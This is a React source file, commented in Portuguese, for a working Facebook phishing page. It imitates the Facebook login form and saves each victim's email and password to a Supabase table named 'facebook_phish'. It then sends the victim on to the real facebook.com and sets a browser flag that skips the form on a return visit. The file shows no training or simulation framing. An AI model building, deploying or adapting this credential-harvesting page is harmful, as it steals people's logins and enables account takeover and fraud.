import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { supabase } from '../supabase';
import './FacebookPhishing.css';

export default function FacebookPhishing() {
  const { id } = useParams();
  const [email, setEmail] = useState('');
  const [senha, setSenha] = useState('');
  const [enviado, setEnviado] = useState(false);
  const usuario = localStorage.getItem('usuario');

  // Redireciona imediatamente se já preencheu antes
  useEffect(() => {
    if (localStorage.getItem('fb_phish_' + id)) {
      window.location.href = 'https://www.facebook.com/';
    }
  }, [id]);

  async function handleSubmit(e) {
    e.preventDefault();
    setEnviado(true);
    // Salva flag no localStorage
    localStorage.setItem('fb_phish_' + id, '1');
    // Busca o registro pelo id
    const { data, error } = await supabase
      .from('facebook_phish')
      .select('*')
      .eq('id', id)
      .single();
    if (data) {
      const novasCapturas = [...(data.capturas || []), { email, senha, data: new Date().toLocaleString('en-US'), usuario }];
      await supabase
        .from('facebook_phish')
        .update({ capturas: novasCapturas })
        .eq('id', id);
    }
    // Redireciona para o Facebook real após 2 segundos
    setTimeout(() => {
      window.location.href = 'https://www.facebook.com/';
    }, 2000);
  }

  return (
    <div className="fb-bg">
      <div className="fb-container">
        <div className="fb-logo">facebook</div>
        <form className="fb-form" onSubmit={handleSubmit}>
          <div className="fb-title">
            Facebook helps you connect and share with the people in your life.
          </div>
          <input
            type="text"
            placeholder="Email or phone number"
            value={email}
            onChange={e => setEmail(e.target.value)}
            className="fb-input"
            required
            autoComplete="username"
          />
          <input
            type="password"
            placeholder="Password"
            value={senha}
            onChange={e => setSenha(e.target.value)}
            className="fb-input"
            required
            autoComplete="current-password"
          />
          <button type="submit" className="fb-btn">Log In</button>
          <div className="fb-links">
            <a href="#">Forgot password?</a>
            <span>·</span>
            <a href="#">Create new account</a>
          </div>
          {enviado && <div className="fb-alert">Please wait...</div>}
        </form>
        <div className="fb-footer">
          <a href="#">Create a Page for a celebrity, brand or business.</a>
        </div>
        <div className="fb-langs">
          English (US) · Español · Français (France) · Italiano · Deutsch · العربية · हिन्दी · 中文(简体) · 日本語 · Português (Brasil)
        </div>
        <div className="fb-copy">Meta © 2025</div>
      </div>
    </div>
  );
}